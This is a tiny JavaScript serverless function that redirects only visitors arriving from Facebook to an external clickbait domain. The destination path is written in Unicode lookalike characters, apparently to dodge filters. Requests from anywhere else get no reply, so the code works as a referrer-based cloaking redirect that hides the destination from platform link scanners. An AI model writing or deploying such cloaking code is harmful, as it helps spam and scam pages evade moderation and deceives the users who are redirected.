exports.handler = async event => {
  if (event.headers.referer.includes('facebook')) {
    return {
      statusCode: 301,
      headers: {
        location: 'https://newheadline24.info/me-95-%d1%82%e1%b4%9co%c9%aa-%d2%bbo%d0%bf-%d4%81o%c9%aa-%e1%b4%86o%c9%aa-%d1%82%c9%aa%e1%b4%8d-%d1%8co-%e1%b4%8de-%e1%b4%a0a-%e1%b4%84a%e1%b4%84%d2%bb-g%c9%aaa%c9%aa-%d5%a6%e1%b4%9c%ca%8fe/'
      }
    }
  }
}